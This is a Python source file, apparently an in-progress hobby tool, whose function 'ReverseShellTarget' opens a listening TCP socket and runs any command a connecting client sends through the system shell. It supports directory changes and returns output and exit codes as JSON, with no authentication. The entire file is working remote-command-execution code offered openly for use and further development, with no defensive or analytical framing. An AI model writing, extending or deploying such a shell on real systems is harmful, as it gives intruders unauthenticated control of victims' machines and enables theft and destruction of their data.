# Note : this is still in beta so yeah if you find any issue or add a new feature open a pull request :D

import socket
import json
import subprocess
import os

HOST = None
PORT = None
def configure(host, port):
    global HOST, PORT
    HOST = host
    PORT = port
def ReverseShellTarget():
    def get_command(request, current_dir):
        if request.startswith("cd "):
            path = request[3:].strip()
            try:
                new_dir = os.path.abspath(os.path.join(current_dir, path))
                os.chdir(new_dir)
                return {
                    "status": "ok",
                    "output": f"Changed to: {new_dir}",
                    "errors": "",
                    "exit_code": 0,
                    "new_dir": new_dir
                }
            except Exception as e:
                return {
                    "status": "error",
                    "output": "",
                    "errors": str(e),
                    "exit_code": 1,
                    "new_dir": current_dir
                }
        
        try:
            result = subprocess.run(
                request,
                capture_output=True,
                text=True,
                shell=True,
                cwd=current_dir
            )
            return {
                "status": "ok",
                "output": result.stdout,
                "errors": result.stderr,
                "exit_code": result.returncode,
                "new_dir": current_dir
            }
        except Exception as e:
            return {
                "status": "error",
                "output": "",
                "errors": str(e),
                "exit_code": 1,
                "new_dir": current_dir
            }

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen()

    print(f"Listening on {HOST}:{PORT}")

    while True:
        conn, addr = server.accept()
        print(f"Client connected: {addr}")
        
        current_dir = os.getcwd()

        with conn:
            while True:
                try:
                    data = conn.recv(4096)
                    
                    if not data:
                        break  

                    request = json.loads(data.decode())
                    command = request.get("action")
                    
                    if not command:
                        continue
                        
                    if command.lower() == "exit":
                        
                        try:
                            conn.send(json.dumps({"status": "ok", "output": "Goodbye"}).encode())
                        except:
                            pass
                        break
                    
                    response = get_command(command, current_dir)
                    if "new_dir" in response:
                        current_dir = response.pop("new_dir")
                    
                    
                    try:
                        conn.send(json.dumps(response).encode())
                    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
                        break  
                        
                except json.JSONDecodeError:
                    continue
                except Exception as e:
                    break 

        print(f"Client disconnected: {addr}")